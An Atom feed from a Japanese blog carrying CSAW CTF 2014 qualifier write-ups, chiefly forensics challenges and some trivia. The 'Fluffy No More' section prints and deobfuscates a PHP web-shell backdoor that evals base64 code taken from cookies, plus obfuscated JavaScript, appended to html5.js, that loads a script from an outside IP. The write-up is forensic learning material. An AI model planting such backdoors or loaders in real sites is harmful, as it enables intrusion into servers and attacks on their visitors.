<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: csaw ctf | Hello (forgotten) world]]></title>
  <link href="http://tech.aquarite.info/blog/categories/csaw-ctf/atom.xml" rel="self"/>
  <link href="http://tech.aquarite.info/"/>
  <updated>2014-11-24T08:23:37+09:00</updated>
  <id>http://tech.aquarite.info/</id>
  <author>
    <name><![CDATA[Mei Akizuru]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Quals Forensics]]></title>
    <link href="http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics/"/>
    <updated>2014-09-23T03:07:38+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/09/23/csawctf2014-forensics</id>
    <content type="html"><![CDATA[<p>CSAW CTF 2014 Quals、Forensicsのwrite-upです。私が解いたのはForensicsの4問中、200点のObscurityを除いた3問です。</p>

<h1>[100] dumpster diving</h1>

<h2>問題文</h2>

<blockquote><p>dumpsters are cool, but cores are cooler</p>

<p>Written by marc</p>

<p>firefox.mem.zip</p></blockquote>

<h2>解答</h2>

<p>Answer: cd69b4957f06cd818d7bf3d61980e291</p>

<p>与えられるのは&#8217;firefox.mem.zip&#8217;で、コアダンプです。私が取りかかった時点で既に他のメンバーからbinwalkしてみたらSQLiteのなんかが見えていると報告がありました。Firefoxのコアダンプであれば何か見えててもおかしくないですね。</p>

<p>とりあえずstringsで何か見えないかなと思ってstringsの出力結果を&#8217;flag&#8217;でgrepしてみます。</p>

<pre><code>(前略)
etablemoz_annosmoz_annos CREATE TABLE moz_annos (  id INTEGER PRIMARY KEY, place_id INTEGER NOT NULL, anno_attribute_id INTEGER, mime_type VARCHAR(32) DEFAULT NULL, content LONGVARCHAR, flags INTEGER DEFAULT 0, expiration INTEGER DEFAULT 0, type INTEGER DEFAULT 0, dateAdded INTEGER DEFAULT 0, lastModified INTEGER DEFAULT 0)
ZZZZZZZZflag{cd69b4957f06cd818d7bf3d61980e291}
ZZZZZZZZZZZZZZTransparent BG enabling flag
(後略)
</code></pre>

<p>マジで見つかりました。本当にありがとうございました。</p>

<h1>[200] why not sftp?</h1>

<h2>問題文</h2>

<blockquote><p>well seriously, why not?</p>

<p>Written by marc</p>

<p>traffic-5.pcap</p></blockquote>

<h2>解答</h2>

<p>Answer: 91e02cd2b8621d0c05197f645668c5c4</p>

<p>与えられる&#8217;traffic-5.pcap&#8217;をとりあえずWiresharkで見てみます。問題名が&#8217;why not sftp?&lsquo;なんだし、きっとFTP通信でなんかやってるだろうと思ってftpとftp-dataでフィルタします。通信を追っていくと&rsquo;/files/zip.zip&#8217;をダウンロードしています。当該するdataの方の通信をFollow TCP Streamするとflag.pngとか書いてあるのでまず間違いなさそうです。ftp-dataのパケットからzip.zipを抽出します。</p>

<p>取り出したzip.zipはパスワードも何もかかっていないのでそのまま展開します。するとflag.pngが展開され、それにフラグが書かれていました。</p>

<p>余談ですが、HTTPでやりとりしたファイルはWiresharkのExport Objectsから取り出せますが、FTPの場合はデータ通信の方をFollow TCP StreamしてRawで保存すればよいことをお勉強しました。</p>

<h1>[300] Fluffy No More</h1>

<h2>問題文</h2>

<blockquote><p>OH NO WE&rsquo;VE BEEN HACKED!!!!!! &ndash; said the Eye Heart Fluffy Bunnies Blog owner. Life was grand for the fluff fanatic until one day the site&rsquo;s users started to get attacked! Apparently fluffy bunnies are not just a love of fun furry families but also furtive foreign governments. The notorious &ldquo;Forgotten Freaks&rdquo; hacking group was known to be targeting high powered politicians. Were the cute bunnies the next in their long list of conquests!??</p>

<p>Well&hellip; The fluff needs your stuff. I&rsquo;ve pulled the logs from the server for you along with a backup of it&rsquo;s database and configuration. Figure out what is going on!</p>

<p>Written by brad_anton</p>

<p>CSAW2014-FluffyNoMore-v0.1.tar.bz2</p></blockquote>

<h2>解答</h2>

<p>Answer: Those Fluffy Bunnies Make Tummy Bumpy</p>

<p>与えられたアーカイブを展開すると、etc_directory.tar.bz、logs.tar.bz2、webroot.tar.bz2、mysql_backup.sql.bz2の4つのファイルが出てきます。それぞれ、etc以下、/var/log以下、/var/www以下を固めたもので、mysql_backup.sql.bz2はmysqldumpの出力結果をbzip2で圧縮したものです。</p>

<p>/var/www以下やデータベースのダンプを見るにWordPressが動いていて、そこがやられたという状況のようです。ひとまずapache2のaccess.logを見ていきます。非常に大きなファイルですが、大半はツールによるアタック試行のログです。SQLインジェクションやら何やらを色々試しています。データベースのダンプを見るとwp_commentsに犯人による犯行予告（「ハックしてやったぜBWHAHAHAHA」じゃなくて「ハックしてやるぜBWHAHAHA」だった）があるので、そのコメントの時刻以降のログを見てみます。</p>

<p>まずPOSTに絞って見てみるとプラグイン絡みでちょっと怪しげなログを見つけました。wysija-newslettersというプラグインで、そのプラグインについて調べてみたところ、任意ファイルのアップロードが可能な脆弱性が存在していたそうです。その後その脆弱性は修正されましたが、実際にはPHPの設定によってはその対策をすり抜けることが可能でした（そしてさらに対策される）。この環境にインストールされているもののバージョンを調べてみると、ちょうどその脆弱性が残っていたバージョンだった上に、<a href="http://blog.sucuri.net/2014/07/mailpoet-vulnerability-exploited-in-the-wild-breaking-thousands-of-wordpress-sites.html">WordPress Security - MailPoet Vuln Contributes to Thousands of Infected Websites | Sucuri Blog</a>で言及されているのと同じ形のログが残っていました。</p>

<p>アクセスログから/wp-content/uploads/wysija/themes/weblizer/template.phpというのにアクセスしていることがわかったので、そのファイルを見てみます。中身は次のようなPHPファイルです。</p>

<pre><code>&lt;?php
$hije = str_replace("ey","","seyteyrey_reyeeypleyaeyceye");
$andp="JsqGMsq9J2NvdW50JzskYT0kX0NPT0tJRTtpZihyZXNldCgkYSsqk9PSdoYScgJisqYgsqJsqGMoJ";
$rhhm="nsqKSwgam9pbihhcnJheV9zbGljZSgkYSwksqYygkYSksqtMykpKSksqpO2VjaG8sqgJsqzwvJy4kay4nPic7fQ==";
$pvqw="GEpPjMpeyRrPSdja2l0JztlY2hvICc8Jy4kaysq4nPicsq7ZXZhbChsqiYXNlNjRfZGVjb2RlKHByZsqWdfcmVw";
$wfrm="bGFjZShhcnsqJheSsqgsqnsqL1teXHcsq9XHNdLycsJy9ccy8nKSwgYsqXJyYXksqoJycsJyssq";
$vyoh = $hije("n", "", "nbnansne64n_ndnecode");
$bpzy = $hije("z","","zczreaztzez_zfzuznzcztzizon");
$xhju = $bpzy('', $vyoh($hije("sq", "", $andp.$pvqw.$wfrm.$rhhm))); $xhju();
?&gt;
</code></pre>

<p><code>$hije</code>が<code>str_replace</code>、<code>$vyoh</code>が<code>base64_decode</code>、<code>$bpzy</code>が<code>create_function</code>関数です。このとき初めて知ったんですが、PHPでは文字列変数に対して<code>$hoge()</code>みたいに<code>()</code>を付けて使うと、その変数に入っている名前の関数を呼び出すという機能があります。びっくり。</p>

<p>それはともかくとして、このコードは</p>

<ol>
<li><code>$andp</code>、<code>$pvqw</code>、<code>$wfrm</code>、<code>$rhhm</code>を結合する</li>
<li>その中の&#8217;sq&#8217;を取り除く</li>
<li>その文字列をBase64デコードする</li>
<li>その文字列を関数化する</li>
<li>それを実行する</li>
</ol>


<p>というコードです。<code>create_function</code>で関数化されたコードは次のコードです（実際の出力を整形しています）</p>

<pre><code>$c='count';
$a=$_COOKIE;
if (reset($a) == 'ha' &amp;&amp; $c($a) &gt; 3) {
  $k='ckit';
  echo '&lt;'.$k.'&gt;';
  eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
  echo '&lt;/'.$k.'&gt;';
}
</code></pre>

<p>Cookieが所定の条件を満たすとき、その中に入っているBase64文字列をevalする、というコードのようです。どう見てもバックドアです。本当にありがとうございました。</p>

<p>しかし、ログに記録されてない上にパケットキャプチャもないので、Cookieの中身はわかりません。つまりどんなコードが実行されたのかが全く不明です。データベースの中に何かしら残っていないか探してみましたが見つかりません。ここで一旦手詰まりとなってしまいました。</p>

<p>そこで隣に座ってた某氏が&#8217;/var/log/auth.log&#8217;を見ていて次の箇所を指摘しました。</p>

<pre><code>Sep 17 19:20:09 ubuntu sudo:   ubuntu : TTY=pts/0 ; PWD=/home/ubuntu/CSAW2014-WordPress/var/www ; USER=root ; COMMAND=/usr/bin/vi /var/www/html/wp-content/themes/twentythirteen/js/html5.js
</code></pre>

<p>ご覧の通り、sudoでviが実行されています。察し。……ていうかubuntuユーザーでログインされてsudoまでされてるんですがそれは……。</p>

<p>それはともかく/wp-content/themes/twentythirteen/js/html5.jsを見てみます。先頭のコメントにHTML5 Shivとあります。バージョンは3.7.0。<a href="https://github.com/aFarkas/html5shiv">HTML5Shivのリポジトリ</a>から3.7.0のファイルをダウンロードし、このファイルとの差異を探すと、末尾に次のコードが追加されていました。</p>

<pre><code>var g="ti";var c="HTML Tags";var f=". li colgroup br src datalist script option .";f = f.split(" ");c="";k="/";m=f[6];for(var i=0;i&lt;f.length;i++){c+=f[i].length.toString();}v=f[0];x="\'ht";b=f[4];f=2541*6-35+46+12-15269;c+=f.toString();f=(56+31+68*65+41-548)/4000-1;c+=f.toString();f="";c=c.split("");var w=0;u="s";for(var i=0;i&lt;c.length;i++){if(((i==3||i==6)&amp;&amp;w!=2)||((i==8)&amp;&amp;w==2)){f+=String.fromCharCode(46);w++;}f+=c[i];} i=k+"anal"; document.write("&lt;"+m+" "+b+"="+x+"tp:"+k+k+f+i+"y"+g+"c"+u+v+"j"+u+"\'&gt;\&lt;/"+m+"\&gt;");
</code></pre>

<p><a href="http://jsbeautifier.org/">beautify</a>してみます。</p>

<pre><code>var g = "ti";
var c = "HTML Tags";
var f = ". li colgroup br src datalist script option .";
f = f.split(" ");
c = "";
k = "/";
m = f[6];
for (var i = 0; i &lt; f.length; i++) {
    c += f[i].length.toString();
}
v = f[0];
x = "\'ht";
b = f[4];
f = 2541 * 6 - 35 + 46 + 12 - 15269;
c += f.toString();
f = (56 + 31 + 68 * 65 + 41 - 548) / 4000 - 1;
c += f.toString();
f = "";
c = c.split("");
var w = 0;
u = "s";
for (var i = 0; i &lt; c.length; i++) {
    if (((i == 3 || i == 6) &amp;&amp; w != 2) || ((i == 8) &amp;&amp; w == 2)) {
        f += String.fromCharCode(46);
        w++;
    }
    f += c[i];
}
i = k + "anal";
document.write("&lt;" + m + " " + b + "=" + x + "tp:" + k + k + f + i + "y" + g + "c" + u + v + "j" + u + "\'&gt;\&lt;/" + m + "\&gt;");
</code></pre>

<p>このコードをnodeに与えて、<code>document.write</code>の引数になっている文字列を見てみると次のようになります。</p>

<p>&#8220;`</p>

<script src='http://128.238.66.100/analytics.js'></script>


<pre><code>
つまりhtml5.jsが実行されると'http://128.238.66.100/analytics.js'が読まれて実行されるわけです。ここにアクセスしてanalytics.jsを見てみます（長いので中身は省略します）。すると、明らかにおかしな箇所がありました。
</code></pre>

<p>var _0x91fe = [&ldquo;\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66&rdquo;, &ldquo;\x5F\x73\x65\x6C\x66&rdquo;, &ldquo;\x6F\x70\x65\x6E&rdquo;];
window<a href="_0x91fe[0],%20_0x91fe[1]">_0x91fe[2]</a>;
&#8220;`</p>

<p><code>_0x91fe</code>に代入している箇所をnodeに与えて中身を見てみます。</p>

<pre><code>&gt; var _0x91fe = ["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x32\x38\x2E\x32\x33\x38\x2E\x36\x36\x2E\x31\x30\x30\x2F\x61\x6E\x6E\x6F\x75\x6E\x63\x65\x6D\x65\x6E\x74\x2E\x70\x64\x66", "\x5F\x73\x65\x6C\x66", "\x6F\x70\x65\x6E"];
undefined
&gt; _0x91fe
[ 'http://128.238.66.100/announcement.pdf',
  '_self',
  'open' ]
</code></pre>

<p>これを踏まえた上で先のコードの2行目を見れば、<code>window['open']</code>(<code>window.open</code>関数)で&#8217;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;を開いていることになります。</p>

<p>&lsquo;<a href="http://128.238.66.100/announcement.pdf">http://128.238.66.100/announcement.pdf</a>&#8216;は実際にPDFで、なんかビジュアル系バンドっぽい人物の写真に&#8217;I AM HACKING YOU RIGHT NOW&#8217;という文が書いてある画像があるだけのPDFです。</p>

<p>ひとしきりここで爆笑して作業に戻りますと、pdfextractでストリームデータをダンプしてみるように言われました。-sオプションを使ってストリームをダンプします。結果として&#8217;stream_{1,2,3,8}.dmp&#8217;の4つのファイルが現れます。これらに対してひとまずstringsをしてみます（ていうか先にfileで見てみるべきだったかもしれない）。すると&#8217;stream_8.dmp&#8217;に何か書かれています。</p>

<pre><code>var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
</code></pre>

<p>JavaScriptっぽいのでnodeに与えてみます。</p>

<pre><code>&gt; var _0xee0b=["\x59\x4F\x55\x20\x44\x49\x44\x20\x49\x54\x21\x20\x43\x4F\x4E\x47\x52\x41\x54\x53\x21\x20\x66\x77\x69\x77\x2C\x20\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x20\x6F\x62\x66\x75\x73\x63\x61\x74\x69\x6F\x6E\x20\x69\x73\x20\x73\x6F\x66\x61\x20\x6B\x69\x6E\x67\x20\x64\x75\x6D\x62\x20\x20\x3A\x29\x20\x6B\x65\x79\x7B\x54\x68\x6F\x73\x65\x20\x46\x6C\x75\x66\x66\x79\x20\x42\x75\x6E\x6E\x69\x65\x73\x20\x4D\x61\x6B\x65\x20\x54\x75\x6D\x6D\x79\x20\x42\x75\x6D\x70\x79\x7D"];var y=_0xee0b[0];
undefined
&gt; _0xee0b
[ 'YOU DID IT! CONGRATS! fwiw, javascript obfuscation is sofa king dumb  :) key{Those Fluffy Bunnies Make Tummy Bumpy}' ]
</code></pre>

<p>というわけで無事にフラグを得ることができました。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[CSAW CTF 2014 Quals Trivia]]></title>
    <link href="http://tech.aquarite.info/blog/2014/09/22/csawctf2014-trivia/"/>
    <updated>2014-09-22T20:18:08+09:00</updated>
    <id>http://tech.aquarite.info/blog/2014/09/22/csawctf2014-trivia</id>
    <content type="html"><![CDATA[<p>CSAW CTF 2014 Qualsに参加してました。日本時間で20日07:00から22日07:00までの48時間。都内某所に泊まり込みでした。そんな感じでWrite-upでございます。この記事はTrivia。</p>

<p>Triviaは全て10点で全6問。うち私が解答したのは3問でした。</p>

<h1>Shameless plug</h1>

<h2>問題文</h2>

<p>This is the name of the new USENIX workshop that featured papers on CTFs being used for education.</p>

<h2>解答</h2>

<p>Answer: 3GSE</p>

<p>&ldquo;USENIX workshop CTF&#8221;でググると&#8221;The Fun and Future of CTF | USENIX&#8221;というのが最初に出てきます。このpaperの投稿先が3GSE &lsquo;14でした。</p>

<h1>We don&rsquo;t know either</h1>

<h2>問題文</h2>

<p>On this day in November, the CSAW Career Fair takes place in Brooklyn, New York.</p>

<h2>解答</h2>

<p>Answer: 14</p>

<p>CSAWのページ（CTFでない）に行くとイベントの中にCareer Fairがあります。そのイベントページに行ってRegistrationのリンクを辿るとNov 13 - Nov 15で何かやってるらしいことがわかります。</p>

<h1>Twitter will you give me @kchung?</h1>

<h2>問題文</h2>

<p>This is the Twitter handle of the student who runs CSAW CTF.</p>

<h2>解答</h2>

<p>Answer: poopsec</p>

<p>&ldquo;kchung&#8221;というのはCSAW CTFの中の人のひとり、Kevin Chung氏。ところがTwitterで@kchungは別の誰かが取っています。彼自身がTwitterで使っている名前が答えなのでTwitterのアカウントを探します。</p>

<p>とりあえず&#8221;Kevin Chung&#8221;でググってみると同姓同名の人物のプロフィールやら何やらが見つかりますが、その中にcodekevin.comというサイトがあります。これが彼のWebサイトで、ここにTwitterのホームへのリンクがあります。</p>
]]></content>
  </entry>
  
</feed>
